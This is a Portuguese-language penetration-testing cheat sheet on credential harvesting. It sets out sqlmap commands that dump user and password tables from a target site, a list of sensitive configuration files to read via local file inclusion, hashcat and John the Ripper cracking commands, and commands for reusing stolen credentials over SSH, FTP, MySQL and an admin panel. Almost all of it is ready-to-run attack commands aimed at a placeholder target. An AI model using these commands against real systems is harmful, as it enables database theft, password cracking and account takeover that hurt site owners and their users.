# Coleta de Credenciais

## Do Banco de Dados

```bash
# SQLMap: dump de usuários
sqlmap -u "http://alvo.com/?id=1" --passwords --batch

# Dump manual de tabelas de usuários
sqlmap -u "http://alvo.com/?id=1" \
  --search -T "user,admin,account,login" \
  --batch

# Extrair combinação usuário:senha
sqlmap -u "http://alvo.com/?id=1" \
  -D app -T users -C "username,password,email" \
  --dump --batch
```

## Arquivos de Configuração

```bash
# Via LFI ou leitura de arquivo SQL
# Alvos prioritários:
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php          # WordPress
/var/www/html/configuration.php      # Joomla
/var/www/html/sites/default/settings.php  # Drupal
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf
```

## Crack de Hashes

### Identificar Tipo
```bash
# Verificar prefixo
$2y$ → bcrypt
$1$ → MD5 crypt
$6$ → SHA-512 crypt
{SHA} → SHA1 base64 (LDAP)
# Sem prefixo, 32 chars → MD5
# Sem prefixo, 40 chars → SHA1
# Sem prefixo, 64 chars → SHA256

# Ferramenta
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"
```

### Hashcat
```bash
# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# WordPress MD5
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM (Windows)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Com regras (mais poderoso)
hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule
```

### John The Ripper
```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hashes.txt
```

### Online (hashes fáceis)
```
https://crackstation.net
https://hashes.com
https://md5decrypt.net
```

## Reutilização de Credenciais

```bash
# Testar credenciais encontradas em outros serviços
# SSH
ssh usuario@alvo.com

# FTP
ftp alvo.com

# MySQL externo
mysql -h alvo.com -u usuario -p

# Painel admin
curl "http://alvo.com/admin" --data "user=admin&pass=SENHA_ENCONTRADA"
```

## Organizar Credenciais Coletadas

```
formato: usuario:senha@alvo.com/servico
admin:admin123@alvo.com/mysql
root:toor@alvo.com/ssh
wp_user:wp_pass@alvo.com/wordpress
```
